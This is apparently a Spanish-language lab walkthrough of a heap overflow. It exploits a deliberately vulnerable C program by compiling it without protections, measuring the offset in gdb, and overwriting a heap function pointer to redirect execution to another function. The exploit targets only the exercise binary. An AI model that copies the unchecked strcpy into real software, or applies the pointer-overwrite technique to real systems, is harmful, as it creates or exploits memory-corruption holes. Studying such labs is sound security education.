# Simple Overflow
## Código VUlnerable
Aquí una muestra del código vulnerable del PDF proporcionado 
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct sdata {
    char buffer[64];
};

struct sfp {
    int (*fp)();
};

void fentrar() {
    printf("Pasando\n");
}

void fesperofuera() {
    printf("Esperando fuera\n");
}

int main(int argc, char **argv) {
    struct sdata *smidat;
    struct sfp *f;

    smidat = malloc(sizeof(struct sdata));
    f = malloc(sizeof(struct sfp));
    f->fp = fesperofuera;

    printf("data: esta en [%p], el puntero fp esta en [%p]\n", smidat, f);

    strcpy(smidat->buffer, argv[1]);  // Vulnerabilidad

    f->fp();
}
```

Luego, compilamos y ejecutamos:
```
gcc heapexample.c -w -g -no-pie -z execstack -o heapexample
./heapexample Hola
```

## Analizar el comportamiento
Ahora, se abre el programa en el depurador
```
gdb ./heapexample

(gdb) list 25,40
(gdb) b 35
(gdb) run XXXX
(gdb) info proc map
```

A continuación, examinamos la memoria del heap con la dirección proporcionada:
```
x/240x 0x7fffffffddd8
```

Después se desensambla la función fesperofuera:
```
disassemble fesperofuera
```

## Crear un payload inicial
Primero, se crea otro archivo de prueba de python:
```
#!/usr/bin/python
print('X' * 90)
```

Luego, ejecutamos esto:
```
chmod +x pp1.py
./pp1.py
./heapexample $(./pp1.py)
```


## Calcular la distancia exacta
Primero, se crea otro archivo de prueba de python:
```
#!/usr/bin/python
print('X' * 70 + 'YAYBYCYDYEYFYG')
```

Luego, ejecutamos GBD:
```
gdb -q ./heapexample
(gdb) run $(./pp2.py)
(gdb) info registers
(gdb) q
```

Para ajustar la longitud precisa, cambiamos el codigo de pp2.py en pp3.py:
```
#!/usr/bin/python
print('X' * 80 + 'CDEF')
```

Luego ejecutamos de nuevo:
```
gdb -q ./heapexample
(gdb) run $(./pp3.py)
(gdb) info registers
(gdb) q
```

## Redirigir la ejecución a fentrar
Primero buscamos la dirección de fentrar():
```
objdump -d simple_overflow | grep fentrar
```

De nuevo, creamos un archivo de python (pp4.py):
```
#!/usr/bin/python
print('X' * 80 + '\x56\x11\x40\x00')
```

Para finalizar, ejecutamos esto y ya sale todo bien:
```
chmod +x pp4.py
./heapexample $(./pp4.py)
```
